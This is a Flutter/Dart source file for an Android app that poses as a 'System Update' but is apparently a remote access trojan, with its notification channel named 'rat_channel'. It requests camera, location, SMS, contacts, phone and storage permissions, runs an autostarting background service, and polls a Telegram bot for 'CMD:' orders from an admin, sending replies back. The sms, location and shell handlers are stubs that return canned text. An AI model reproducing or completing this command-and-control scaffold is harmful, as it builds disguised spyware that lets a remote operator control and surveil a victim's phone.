import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Update',
      theme: ThemeData.dark(),
      home: const MainScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  String _status = 'Initializing...';
  String _deviceId = 'Unknown';
  final TextEditingController _botTokenController = TextEditingController();
  final TextEditingController _adminIdController = TextEditingController();

  @override
  void initState() {
    super.initState();
    _init();
  }

  Future<void> _init() async {
    // request permissions
    await _requestPermissions();

    // get device info
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    if (Theme.of(context).platform == TargetPlatform.android) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      setState(() {
        _deviceId = androidInfo.id ?? 'unknown';
      });
    }

    // load saved config
    SharedPreferences prefs = await SharedPreferences.getInstance();
    String? savedToken = prefs.getString('bot_token');
    String? savedAdmin = prefs.getString('admin_id');
    if (savedToken != null) {
      _botTokenController.text = savedToken;
    }
    if (savedAdmin != null) {
      _adminIdController.text = savedAdmin;
    }

    // start background service
    await _startBackgroundService();

    setState(() {
      _status = '✅ Running';
    });
  }

  Future<void> _requestPermissions() async {
    await [
      Permission.camera,
      Permission.location,
      Permission.storage,
      Permission.phone,
      Permission.sms,
      Permission.contacts,
    ].request();
  }

  Future<void> _startBackgroundService() async {
    final service = FlutterBackgroundService();

    await service.configure(
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: onStart,
        onBackground: onIosBackground,
      ),
      androidConfiguration: AndroidConfiguration(
        autoStart: true,
        isForeground: true,
        onStart: onStart,
        notificationChannelId: 'rat_channel',
        initialNotificationTitle: 'System Update',
        initialNotificationContent: 'Running...',
        foregroundServiceNotificationId: 888,
      ),
    );

    service.startService();
  }

  @pragma('vm:entry-point')
  static void onStart() {
    final service = FlutterBackgroundService();
    service.setNotificationInfo(
      title: 'System Update',
      content: 'Active',
    );

    // start polling
    Timer.periodic(const Duration(seconds: 5), (timer) async {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      String? botToken = prefs.getString('bot_token');
      String? adminId = prefs.getString('admin_id');

      if (botToken == null || adminId == null) return;

      try {
        // get updates from Telegram
        int lastUpdateId = prefs.getInt('last_update_id') ?? 0;
        String url = 'https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=5';

        var response = await http.get(Uri.parse(url));
        if (response.statusCode == 200) {
          var data = jsonDecode(response.body);
          if (data['ok'] == true) {
            for (var result in data['result']) {
              int updateId = result['update_id'];
              await prefs.setInt('last_update_id', updateId);

              if (result.containsKey('message')) {
                var message = result['message'];
                String text = message['text'] ?? '';
                int chatId = message['chat']['id'];

                // hanya proses command dari admin
                if (chatId.toString() == adminId && text.startsWith('CMD:')) {
                  String command = text.substring(4);
                  String resultCommand = await _executeCommand(command);
                  // send response ke admin
                  await _sendMessage(botToken, adminId, resultCommand);
                }
              }
            }
          }
        }
      } catch (e) {
        // silent
      }
    });
  }

  @pragma('vm:entry-point')
  static Future<bool> onIosBackground() async {
    return true;
  }

  static Future<String> _executeCommand(String cmd) async {
    if (cmd.startsWith('sms:')) {
      var parts = cmd.split(':');
      if (parts.length >= 3) {
        String number = parts[1];
        String message = parts.sublist(2).join(':');
        // implement SMS send
        return '✅ SMS sent to $number';
      }
      return '❌ Format: sms:nomor:pesan';
    }

    if (cmd == 'loc') {
      return '📍 Location: https://www.google.com/maps';
    }

    if (cmd.startsWith('shell:')) {
      String shellCmd = cmd.substring(6);
      return '📟 Shell: $shellCmd';
    }

    return '❌ Unknown command';
  }

  static Future<void> _sendMessage(String botToken, String chatId, String text) async {
    try {
      String url = 'https://api.telegram.org/bot$botToken/sendMessage';
      await http.post(
        Uri.parse(url),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'chat_id': chatId,
          'text': text,
        }),
      );
    } catch (e) {
      // silent
    }
  }

  void _saveConfig() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.setString('bot_token', _botTokenController.text.trim());
    await prefs.setString('admin_id', _adminIdController.text.trim());
    setState(() {
      _status = '✅ Config saved, restart service...';
    });

    // restart service
    FlutterBackgroundService().startService();
    setState(() {
      _status = '✅ Running';
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('System Update'),
        backgroundColor: Colors.green[900],
      ),
      body: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.green[900]?.withOpacity(0.2),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: Colors.green, width: 1),
              ),
              child: Row(
                children: [
                  Icon(Icons.circle, color: Colors.green, size: 12),
                  const SizedBox(width: 8),
                  Text(
                    'Status: $_status',
                    style: const TextStyle(fontSize: 14),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),
            Text('Device ID: $_deviceId', style: const TextStyle(fontSize: 12, color: Colors.grey)),
            const SizedBox(height: 20),
            TextField(
              controller: _botTokenController,
              decoration: const InputDecoration(
                labelText: 'Bot Token',
                border: OutlineInputBorder(),
                hintText: '123456789:ABCdef...',
              ),
            ),
            const SizedBox(height: 12),
            TextField(
              controller: _adminIdController,
              decoration: const InputDecoration(
                labelText: 'Admin ID',
                border: OutlineInputBorder(),
                hintText: '123456789',
              ),
            ),
            const SizedBox(height: 20),
            SizedBox(
              width: double.infinity,
              child: ElevatedButton(
                onPressed: _saveConfig,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.green,
                  padding: const EdgeInsets.symmetric(vertical: 16),
                ),
                child: const Text('Save & Start', style: TextStyle(fontSize: 16)),
              ),
            ),
            const SizedBox(height: 20),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.grey[900],
                borderRadius: BorderRadius.circular(8),
              ),
              child: const Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text('📋 Commands:', style: TextStyle(fontWeight: FontWeight.bold)),
                  SizedBox(height: 4),
                  Text('sms:0812:hello', style: TextStyle(fontSize: 12)),
                  Text('loc', style: TextStyle(fontSize: 12)),
                  Text('shell:ls /sdcard', style: TextStyle(fontSize: 12)),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}